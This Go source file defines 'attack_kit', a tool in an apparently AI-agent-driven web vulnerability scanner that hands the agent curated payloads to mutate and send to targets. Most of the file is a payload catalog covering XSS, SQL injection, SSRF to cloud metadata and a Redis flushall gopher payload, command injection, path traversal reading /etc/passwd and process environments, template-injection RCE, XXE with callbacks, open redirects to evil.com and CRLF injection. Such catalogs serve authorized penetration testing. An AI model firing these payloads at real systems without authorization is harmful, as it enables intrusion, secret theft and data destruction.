package vigtool

import (
	"context"
	"encoding/json"
	"fmt"
	"sort"
	"strings"

	"github.com/vigolium/vigolium/pkg/olium/tool"
)

// NewAttackKitTool returns the attack_kit tool — a curated, read-only
// catalog of starter payloads per attack class. Saves the agent from
// inventing weak/generic payloads from scratch; the model can then mutate
// or extend the kit before feeding payloads into replay_request.
func NewAttackKitTool() tool.Tool {
	return &attackKitTool{}
}

type attackKitTool struct{}

func (*attackKitTool) Name() string     { return "attack_kit" }
func (*attackKitTool) Label() string    { return "Lookup attack payloads" }
func (*attackKitTool) Category() string { return tool.CategoryVigolium }
func (*attackKitTool) IsReadOnly() bool { return true }
func (*attackKitTool) Description() string {
	return "Return a curated starter payload set for an attack class. Classes: xss, sqli, ssrf, " +
		"cmd-injection, path-traversal, ssti, xxe, open-redirect, crlf. Each payload comes with a " +
		"short note on what it detects. Use these as a baseline and mutate per target (encoding, " +
		"comment style, callback host). Pair with replay_request to actually send them. Call with no " +
		"args to see the list of available classes."
}

func (*attackKitTool) Schema() map[string]any {
	return map[string]any{
		"type": "object",
		"properties": map[string]any{
			"class": map[string]any{
				"type":        "string",
				"description": "Attack class. Omit to list available classes. One of: xss, sqli, ssrf, cmd-injection, path-traversal, ssti, xxe, open-redirect, crlf.",
			},
		},
	}
}

type kitPayload struct {
	Payload string `json:"payload"`
	Note    string `json:"note"`
}

// attackPayloads holds the curated starter sets. Kept small on purpose —
// the model is better at riffing on a handful of canonical shapes than at
// picking from a thousand near-duplicates.
// attackClasses is the sorted list of keys in attackPayloads, populated by
// init(). Used in both the "no class arg" listing and the unknown-class
// error path so we don't rebuild and re-sort on every call.
var attackClasses []string

func init() {
	attackClasses = make([]string, 0, len(attackPayloads))
	for k := range attackPayloads {
		attackClasses = append(attackClasses, k)
	}
	sort.Strings(attackClasses)
}

var attackPayloads = map[string][]kitPayload{
	"xss": {
		{Payload: `"><script>alert(1)</script>`, Note: "Break out of attribute, inject inline script. Detect via reflection of the literal payload in response."},
		{Payload: `'><img src=x onerror=alert(1)>`, Note: "Single-quote escape, image-error handler. Useful when double-quote variant is filtered."},
		{Payload: `<svg/onload=alert(1)>`, Note: "Tagless-style XSS. Bypasses naive `<script>` regex filters."},
		{Payload: `javascript:alert(1)`, Note: "URI-context injection. Try in href/src/action sinks."},
		{Payload: `"-confirm(1)-"`, Note: "JS string-context break. Works when payload is reflected inside a JS string literal."},
		{Payload: `<iframe srcdoc="<svg/onload=alert(1)>">`, Note: "srcdoc bypass for some sanitizers."},
		{Payload: `{{constructor.constructor('alert(1)')()}}`, Note: "AngularJS sandbox-escape — only relevant if the response renders client-side Angular templates."},
	},
	"sqli": {
		{Payload: `' OR '1'='1`, Note: "Classic string-context truth condition. Watch for content-length / row-count delta vs baseline."},
		{Payload: `" OR "1"="1`, Note: "Double-quote variant."},
		{Payload: `') OR ('1'='1`, Note: "Parenthesised query, e.g. `WHERE (x='?')`."},
		{Payload: `1 OR 1=1`, Note: "Numeric-context truth condition. Use against integer-typed params."},
		{Payload: `' UNION SELECT NULL-- -`, Note: "UNION probe — adjust NULL count to match column count. Add to baseline-diff to detect."},
		{Payload: `'||(SELECT '')||'`, Note: "Oracle-style string concat probe."},
		{Payload: `'; WAITFOR DELAY '0:0:5'-- `, Note: "MSSQL time-based blind. Confirm via response-time delta."},
		{Payload: `' AND SLEEP(5)-- -`, Note: "MySQL time-based blind. Confirm via response-time delta (~5s)."},
		{Payload: `' AND pg_sleep(5)-- `, Note: "Postgres time-based blind."},
		{Payload: `' OR 1=CONVERT(int,(SELECT @@version))-- `, Note: "MSSQL error-based — surfaces version string in error message."},
	},
	"ssrf": {
		{Payload: `http://169.254.169.254/latest/meta-data/`, Note: "AWS IMDSv1 metadata. If the target is hosted on EC2, a successful fetch returns instance metadata."},
		{Payload: `http://metadata.google.internal/computeMetadata/v1/`, Note: "GCP metadata. Needs Metadata-Flavor: Google header — try as separate test."},
		{Payload: `http://127.0.0.1:80/`, Note: "Loopback probe. Watch for HTTP-banner reflection in error / response."},
		{Payload: `http://[::1]/`, Note: "IPv6 loopback — bypass simple 127.0.0.1 blocklists."},
		{Payload: `http://0.0.0.0/`, Note: "Quad-zero loopback — bypasses common 127.* blocklists."},
		{Payload: `http://2130706433/`, Note: "Decimal-encoded 127.0.0.1 — bypasses string blocklists."},
		{Payload: `http://127.1/`, Note: "Short-form loopback (some libs expand). Bypasses naive regex."},
		{Payload: `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a`, Note: "Gopher protocol smuggling — Redis flushall PoC. Tests for unrestricted scheme handling."},
		{Payload: `file:///etc/passwd`, Note: "Local file inclusion via file:// scheme. Look for Unix passwd content in response."},
		{Payload: `dict://127.0.0.1:11211/stats`, Note: "Memcached stats probe via dict:// scheme."},
	},
	"cmd-injection": {
		{Payload: `; id`, Note: "Bash command chain. Look for uid=/gid= in response."},
		{Payload: `| id`, Note: "Pipe variant — works when ; is filtered."},
		{Payload: "`id`", Note: "Backtick command substitution."},
		{Payload: `$(id)`, Note: "Dollar-paren command substitution."},
		{Payload: `; sleep 5`, Note: "Time-based blind. Confirm via response-time delta."},
		{Payload: `& whoami`, Note: "Windows command chain (cmd.exe)."},
		{Payload: `| whoami`, Note: "Windows pipe — works against PowerShell sinks too."},
		{Payload: `; ping -c 1 oast.host`, Note: "OOB confirmation — replace oast.host with a real OAST callback URL (see oast_poll)."},
		{Payload: `;${IFS}id`, Note: "IFS variable trick — bypasses naive whitespace filters."},
	},
	"path-traversal": {
		{Payload: `../../../../etc/passwd`, Note: "Unix file read. Look for root:x:0:0 prefix."},
		{Payload: `..\..\..\..\windows\win.ini`, Note: "Windows file read. Look for [fonts] or [extensions]."},
		{Payload: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`, Note: "URL-encoded — bypasses naive '..' filters."},
		{Payload: `..%252f..%252f..%252fetc%252fpasswd`, Note: "Double URL-encoded — bypasses single-decode filters."},
		{Payload: `....//....//....//etc/passwd`, Note: "Dot-dot-slash variant — bypasses '../' strip filters."},
		{Payload: `/etc/passwd%00.png`, Note: "Null-byte truncation (legacy PHP). File-extension-suffix bypass."},
		{Payload: `/proc/self/environ`, Note: "Linux process env — leaks environment variables (often includes secrets)."},
	},
	"ssti": {
		{Payload: `{{7*7}}`, Note: "Generic probe — Jinja2/Twig/Django reflect '49'. Confirms server-side template rendering."},
		{Payload: `${7*7}`, Note: "JSP/Freemarker/Velocity probe — reflects '49'."},
		{Payload: `<%= 7*7 %>`, Note: "ERB/JSP — reflects '49'."},
		{Payload: `{{7*'7'}}`, Note: "Distinguishes Jinja2 ('7777777') from Twig ('49')."},
		{Payload: `{{config}}`, Note: "Jinja2/Flask — dumps app config (often leaks SECRET_KEY)."},
		{Payload: `{{request.application.__globals__}}`, Note: "Jinja2 RCE primitive — exposes Python globals."},
		{Payload: `${T(java.lang.Runtime).getRuntime().exec('id')}`, Note: "Spring SpEL RCE — confirms via cmd execution."},
		{Payload: `*{7*7}`, Note: "Spring SpEL/OGNL — reflects '49' for OGNL contexts."},
	},
	"xxe": {
		{Payload: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`, Note: "Classic in-band XXE — payload entity expanded into response."},
		{Payload: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://oast.host/leak">]><r>&x;</r>`, Note: "Blind XXE — confirm via OAST callback (use oast_poll). Replace oast.host."},
		{Payload: `<?xml version="1.0"?><!DOCTYPE r PUBLIC "-//A/B" "http://oast.host/dtd"><r>x</r>`, Note: "External DTD probe — alternative for blind detection."},
	},
	"open-redirect": {
		{Payload: `//evil.com/`, Note: "Protocol-relative — bypasses naive prefix checks like 'starts with /'."},
		{Payload: `https://evil.com`, Note: "Full URL — works on parameters that don't validate the domain at all."},
		{Payload: `//evil.com%2F.target.com`, Note: "URL-encoded path mixing — confuses URL parsers."},
		{Payload: `https://target.com.evil.com`, Note: "Subdomain confusion — bypasses suffix-only allowlists."},
		{Payload: `/\evil.com`, Note: "Backslash bypass — some parsers normalize \\ to /."},
		{Payload: `javascript:alert(1)`, Note: "JS-scheme redirect — XSS via redirect endpoints that don't validate scheme."},
	},
	"crlf": {
		{Payload: "%0d%0aSet-Cookie: injected=1", Note: "Inject a Set-Cookie header via CRLF in a redirect-Location-style sink."},
		{Payload: "%0d%0aX-Injected: 1", Note: "Generic header injection — easiest probe; look for X-Injected in response headers."},
		{Payload: "%0d%0a%0d%0a<script>alert(1)</script>", Note: "Header→body break for response-splitting / reflected XSS."},
		{Payload: "%E5%98%8A%E5%98%8DX-Injected: 1", Note: "UTF-8-encoded CR/LF — bypasses naive %0d%0a filters."},
	},
}

func (a *attackKitTool) Execute(_ context.Context, args map[string]any, _ tool.UpdateFn) (tool.Result, error) {
	class := strings.ToLower(argsString(args, "class"))
	if class == "" {
		body, _ := json.Marshal(map[string]any{
			"available_classes": attackClasses,
			"hint":              "Call attack_kit with class='xss' (or another listed class) to get payloads.",
		})
		return tool.Result{Content: string(body)}, nil
	}

	payloads, ok := attackPayloads[class]
	if !ok {
		return tool.Result{
			Content: fmt.Sprintf("attack_kit: unknown class %q. Available: %s", class, strings.Join(attackClasses, ", ")),
			IsError: true,
		}, nil
	}

	out := struct {
		Class    string       `json:"class"`
		Count    int          `json:"count"`
		Payloads []kitPayload `json:"payloads"`
		Hint     string       `json:"hint"`
	}{
		Class:    class,
		Count:    len(payloads),
		Payloads: payloads,
		Hint:     "Pass each payload as a `payload` value in replay_request mutations. Mutate per target as needed (encoding, comment style, callback host).",
	}
	body, _ := json.Marshal(out)
	return tool.Result{
		Content: string(body),
		Details: map[string]any{
			"class": class,
			"count": len(payloads),
		},
	}, nil
}
